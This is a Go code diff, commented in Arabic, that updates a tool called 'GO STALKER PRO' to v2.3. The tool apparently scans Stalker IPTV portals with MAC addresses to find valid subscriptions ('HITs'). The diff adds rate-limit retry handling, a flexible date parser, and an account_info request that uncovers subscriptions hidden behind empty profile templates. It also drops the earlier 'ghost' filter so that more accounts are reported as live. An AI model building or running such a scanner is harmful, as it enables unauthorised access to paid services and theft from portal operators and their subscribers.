@@ -22,6 +22,7 @@ import (
 // 3) HIT حقيقي: الرد المقفول (js.msg) لا يُعد HIT + عدّ القنوات فعلياً (get_all_channels)
 // 4) إحصائيات صادقة: AuthFail منفصلة عن NetworkFail
 // 5) v2.2: إعادة المحاولة عند 429/503 (Rate-Limit) مع احترام Retry-After
+// 6) v2.3: account_info يكشف الاشتراكات المخفية خلف قالب فارغ (تاريخ الانتهاء في phone/end_date)
 
 func syncAndClose(file *os.File) error {
 	if file == nil {
@@ -93,6 +94,27 @@ func checkScannerError(scanner *bufio.Scanner) error {
 		return fmt.Errorf("file scanning failed: %w", err)
 	}
 	return nil
+}
+
+// ── v2.3: تواريخ بأشكال متعددة (بما فيها November 25, 2026, 1:41 am) ──
+func parseFlexDate(value string) (time.Time, bool) {
+	value = strings.TrimSpace(value)
+	if value == "" {
+		return time.Time{}, false
+	}
+	layouts := []string{
+		"January 2, 2006, 3:04 pm",
+		"January 2, 2006, 15:04",
+		"January 2, 2006",
+		"2006-01-02 15:04:05",
+		"2006-01-02",
+	}
+	for _, layout := range layouts {
+		if t, err := time.ParseInLocation(layout, value, time.Local); err == nil {
+			return t, true
+		}
+	}
+	return time.Time{}, false
 }
 
 func calculateRemaining(expiration time.Time) string {
@@ -410,6 +432,45 @@ func performGetProfile(client *http.Client, portalURL, endpoint, mac, token stri
 	return profileResult, nil
 }
 
+// ── v2.3: account_info — مصدر الحقيقة على بوابات تخفي الملف خلف قالب فارغ ──
+func performAccountInfo(client *http.Client, portalURL, endpoint, mac, token string) (string, string, error) {
+	aiURL := fmt.Sprintf("%s%s?type=account_info&action=get_main_info&JsHttpRequest=1-xml", portalURL, endpoint)
+	req, err := http.NewRequest("GET", aiURL, nil)
+	if err != nil {
+		return "", "", err
+	}
+	headers := hea2(mac, token)
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
+	resp, err := doWithRetry(client, req)
+	if err != nil {
+		return "", "", err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 {
+		return "", "", fmt.Errorf("status code: %d", resp.StatusCode)
+	}
+	var r map[string]interface{}
+	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
+		return "", "", err
+	}
+	var js map[string]interface{}
+	if j, ok := r["js"].(map[string]interface{}); ok {
+		js = j
+	}
+	getStr := func(k string) string {
+		if js == nil {
+			return ""
+		}
+		if s, ok := js[k].(string); ok {
+			return strings.TrimSpace(s)
+		}
+		return ""
+	}
+	return getStr("phone"), getStr("end_date"), nil
+}
+
 // ── إصلاح 3: عدّ القنوات الحقيقي — HIT بلا قنوات = مشبوه ──
 func fetchChannelsCount(client *http.Client, portalURL, endpoint, mac, token string) int {
 	chURL := fmt.Sprintf("%s%s?type=stb&action=get_all_channels&JsHttpRequest=1-xml", portalURL, endpoint)
@@ -483,7 +544,7 @@ func main() {
 	reader := bufio.NewReader(os.Stdin)
 
 	fmt.Println("==================================================")
-	fmt.Println("   ⚡ GO STALKER PRO - v2.2     ⚡                 ")
+	fmt.Println("   ⚡ GO STALKER PRO - v2.3     ⚡                 ")
 	fmt.Println("==================================================")
 
 	fmt.Print("Enter Portal URL (e.g. http://example.com:8080[/c]): ")
@@ -665,11 +726,6 @@ func main() {
 					if id0, ok2 := dataMap["id"].(float64); ok2 && id0 > 0 {
 						hasReal = true
 					}
-					if !hasReal {
-						ghostCount.Add(1)
-						continue
-					}
-
 					expDate := "Unknown"
 					daysRemaining := "N/A"
 
@@ -677,6 +733,27 @@ func main() {
 						if parsedTime, ok := parseExpirationDate(expVal); ok {
 							expDate = parsedTime.Format("2006-01-02 15:04:05")
 							daysRemaining = calculateRemaining(parsedTime)
+						}
+					}
+
+					// ── v2.3: القالب الفارغ ليس حكماً نهائياً — اسأل account_info ──
+					if !hasReal {
+						phone, endDate, aiErr := performAccountInfo(client, portalBase, endpoint, mac, authToken)
+						aiExp := endDate
+						if aiExp == "" {
+							aiExp = phone
+						}
+						if aiErr == nil && aiExp != "" && aiExp != "0000-00-00 00:00:00" {
+							if t, ok := parseFlexDate(aiExp); ok {
+								expDate = t.Format("2006-01-02 15:04:05")
+								daysRemaining = calculateRemaining(t)
+							} else {
+								expDate = aiExp
+								daysRemaining = "N/A"
+							}
+						} else {
+							ghostCount.Add(1)
+							continue
 						}
 					}
 
